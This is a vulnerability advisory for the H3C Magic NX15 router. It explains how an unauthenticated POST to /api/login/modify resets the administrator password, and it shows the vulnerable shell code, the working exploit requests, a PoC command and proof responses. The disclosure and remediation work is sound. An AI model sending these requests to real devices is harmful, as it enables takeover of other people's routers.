# H3C Magic NX15 `/api/login/modify` Pre-Auth Missing Authentication to Administrator Account Takeover

## Vulnerability Summary

- Discovery date: 2026-05-26
- Researcher: coconut
- Vendor: H3C
- Product: H3C Magic NX15
- Verified firmware / software version: NX15V100R017
- Affected version(s): NX15V100R017 confirmed; other versions not verified
- Component: `/api/login/modify` password-change flow (`FCIG_LoginProcess` -> `esps.system changepasswd`)
- Reachable endpoint: `POST /api/login/modify`
- Reachable method / action: `changepasswd`
- Authentication: none
- Attack vector: remote
- Impact: unauthenticated administrator password change and valid administrator session issuance
- Root cause class: missing authentication for a critical password-change function
- Candidate CWEs: `CWE-306`, `CWE-862`
- Disclosure status: public
- CVE ID: pending

## CVE Submission-Style Summary

H3C Magic NX15 `NX15V100R017` contains a pre-auth vulnerability in the `/api/login/modify` password-change flow reachable via `POST /api/login/modify`. The vulnerable code path accepts attacker-controlled input through the JSON field `newPass` and passes it to `esps.system changepasswd` without a session check on the `/login/modify` route. On the verified firmware configuration, `password_consistent_switch` is set to `1`, so the backend updates `system.system.password` after validating only the new password format and not the old password. This allows an unauthenticated remote attacker to set an administrator password of their choice.

The issue was verified by source inspection of `esps.system`, string analysis of the extracted MIPS `/www/api` binary, and the included live test record. On the tested target, exploitation results in administrator account takeover because `POST /api/login/modify` returns `{"code":0}` without authentication and a follow-up `POST /api/login/auth` with the attacker-chosen password returns `{"code":0,"message":"Success","data":{"session":"08ffcf3a"}}`.

## Attack Surface

Verified fact: the `lighttpd.conf` exposes the FastCGI binary `/www/api` on HTTP/80. The issue is reachable through the web management API at `POST /api/login/modify`. The attacker-controlled field is `newPass`; `oldPass` is optional in the backend script and may be omitted.

```http
POST /api/login/modify HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
```

## Authentication Boundary

### Pattern A: pre-auth

This issue is pre-auth. No valid session, token, or credentials are required to reach the vulnerable code path.

Verified fact: the included PoC sends `POST /api/login/modify` without an `AUTHENTICATION` header, and the existing verification note records a successful `{"code":0}` response.

## Root Cause

### 1. Vulnerable input source

The backend reads attacker-controlled JSON fields from the `/api/login/modify` request body. In the extracted `esps.system` script, the `changepasswd` handler parses `oldPass` and `newPass` and proceeds when `newPass` is present.

### 2. Vulnerable sink

Verified fact: the extracted `esps.system` contains the following relevant logic:

```sh
change_passwd()
{
    oldPass="${1}"
    newPass="${2}"
    password_consistent_switch=$(uci get system.system.password_consistent_switch)
    if [ -n "${password_consistent_switch}" ] && [ "${password_consistent_switch}" == "1" ];then
        if ! is_valid_passwd "${newPass}";then
            code=531
        else
            uci set system.system.password="$(echo "${newPass}" | base64)" || code=525
        fi
    else
        curPass=$(uci get system.system.password)
        oldPass=$(echo "${oldPass}" | base64)
        if [ "${curPass}" == "${oldPass}" ];then
            ...
        else
            code=517
        fi
    fi
}

changepasswd)
    read input
    json_load "${input}"
    json_get_var _oldPass oldPass
    json_get_var _newPass newPass
    if [ -z "${_oldPass}" ];then
        _oldPass="admin"
    fi
    if [ -n "${_newPass}" ];then
        code=$(change_passwd "${_oldPass}" "${_newPass}")
        if [ ${code} -eq 0 ];then
            uci commit system
            ubus call reload reload_config '{"config":"system","method":"reload","status":0}'
        fi
    fi
```

The dangerous operation is the unauthorized write to `system.system.password`, followed by `uci commit system` and configuration reload.

### 3. Why exploitation works

- `newPass` is fully attacker-controlled.
- Verified fact: the extracted `system` config sets `option password_consistent_switch '1'` on the verified firmware.
- Under that setting, `change_passwd()` validates only the new password syntax and does not compare the supplied or defaulted `oldPass` value against the current password.
- Verified fact: the current evidence set records `/api/login/modify` as a pre-auth route that reaches `esps.system changepasswd`; corroborating string evidence in `/www/api` includes `FCIG_LoginProcess`, `FCGI_UbusPassThrough`, `/login/modify`, `changepasswd`, `/login/quit`, and `HTTP_AUTHENTICATION`.
- When the handler returns success, the script commits the new password and reloads the relevant configuration, making the attacker-chosen password immediately usable for login.

## Reverse Engineering Evidence

### Primary function / handler evidence

- file / module: `esps.system`
- function name: `change_passwd()` / `changepasswd`
- function address: `N/A`
- function size: `N/A`

Relevant source-level snippet:

```sh
password_consistent_switch=$(uci get system.system.password_consistent_switch)
if [ -n "${password_consistent_switch}" ] && [ "${password_consistent_switch}" == "1" ];then
    if ! is_valid_passwd "${newPass}";then
        code=531
    else
        uci set system.system.password="$(echo "${newPass}" | base64)" || code=525
    fi
fi
```

### Control-flow or data-flow summary

Verified facts:

- `lighttpd.conf` maps the HTTP `api` handler to `/www/api`.
- The extracted `/www/api` binary is a MIPS32R2 ELF and contains the strings `FCIG_LoginProcess`, `FCGI_UbusPassThrough`, `/login/modify`, `changepasswd`, `/login/quit`, and `HTTP_AUTHENTICATION`.
- `esps.system` implements `changepasswd` by calling `change_passwd()` and, on success, commits and reloads the password configuration.

Inference: combining the recorded reverse-engineering note in `01_preauth_login_modify_report.md` with the corroborating string table yields the shortest verified path `POST /api/login/modify` -> `/www/api` `FCIG_LoginProcess` -> `FCGI_UbusPassThrough("esps.system", "changepasswd", body)` -> `change_passwd()` -> `uci set system.system.password=...` -> `POST /api/login/auth` accepts the new password.

### Secondary component evidence

- file / script / service: `api` and `system`
- role in exploitation: `/www/api` exposes the pre-auth route; `system` enables the no-old-password branch via `password_consistent_switch '1'`

Relevant snippet:

```text
/api strings: "FCIG_LoginProcess" "FCGI_UbusPassThrough" "/login/modify" "changepasswd" "HTTP_AUTHENTICATION"
system config: option password_consistent_switch '1'
```

## Verified Exploitation Chain

### Mode A: unauthenticated password overwrite and administrator session acquisition

- prerequisites: network reachability to `192.168.8.1`; no valid credentials required for the password-change request
- injected field / primitive: JSON field `newPass`
- target path / object / resource: `system.system.password`
- verified payload:

```text
TmpPass123!
```

Effect:

1. The attacker sends `POST /api/login/modify` with `{"newPass":"TmpPass123!"}` and no authentication header.
2. The target returns `{"code":0}`.
3. The attacker sends `POST /api/login/auth` with `{"username":"admin","password":"TmpPass123!"}`.
4. The target returns `{"code":0,"message":"Success","data":{"session":"08ffcf3a"}}`, proving that the password change took effect and yielded a valid administrator session.

## Live Exploitation Evidence

### PoC-generated payload

```text
TmpPass123!
```

### PoC-sent request body

```json
{
  "newPass": "TmpPass123!"
}
```

### Success condition

The exact observable proof is a successful unauthenticated password-change response followed by successful authenticated session issuance with the attacker-chosen password:

- `POST /api/login/modify` -> `{"code":0}`
- `POST /api/login/auth` with `{"username":"admin","password":"TmpPass123!"}` -> `{"code":0,"message":"Success","data":{"session":"08ffcf3a"}}`

Verified fact: the existing verification note also records a second unauthenticated `POST /api/login/modify` call restoring the password to `admin123`, which supports repeatability.

## Why This Is Administrator Account Takeover

This primitive directly changes the administrator credential and immediately yields a valid administrator web session. Once the attacker can authenticate as the administrator, the device's authenticated management API surface is exposed to the attacker without any additional exploit step.

## Minimal HTTP Request Shape

### 1. Primary trigger request

```http
POST /api/login/modify HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"newPass":"TmpPass123!"}
```

### 2. Secondary trigger request

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"username":"admin","password":"TmpPass123!"}
```

## Minimal Vulnerable Flow

```text
Unauthenticated remote attacker
  -> POST /api/login/modify
  -> /www/api
  -> FCGI_UbusPassThrough("esps.system", "changepasswd", body)
  -> change_passwd()
  -> uci set system.system.password=base64(newPass)
  -> uci commit system and reload
  -> POST /api/login/auth
  -> valid administrator session
```

## PoC Command Examples

### Example command

```powershell
python .\preauth_login_modify_takeover.py --base http://192.168.8.1 --username admin --old-password admin123 --new-password TmpPass123! --restore
```

This command demonstrates the unauthenticated password change, verifies login with the attacker-chosen password, and then restores the prior test password. Only `--base` and `--new-password` are required for exploitation; `--username`, `--old-password`, and `--restore` are verification convenience options.

## Reproduction Notes

- target environment: H3C Magic NX15 router, firmware `NX15V100R017`
- network assumptions: attacker can reach the web interface on the local LAN; the verified target address is `192.168.8.1`
- required attacker setup: none for raw HTTP reproduction; Python with `requests` for the supplied PoC
- expected output: `{"code":0}` from `POST /api/login/modify`, then `{"code":0,...,"session":...}` from `POST /api/login/auth`
- common failure cases: `newPass` rejected because it is shorter than 6 characters, longer than 63 characters, or contains `'`, `"`, `` ` ``, `/`, or `\`; the target is not running the verified firmware/configuration; vendor fixes add an authentication gate to `/api/login/modify`

## Remediation Ideas

- Remove `/api/login/modify` from the pre-auth route set and require a valid administrator session.
- Enforce current-password verification in `change_passwd()` regardless of `password_consistent_switch`.
- Reject missing `oldPass` values instead of defaulting them.
- Add regression tests ensuring that password-change handlers cannot be invoked before authentication.
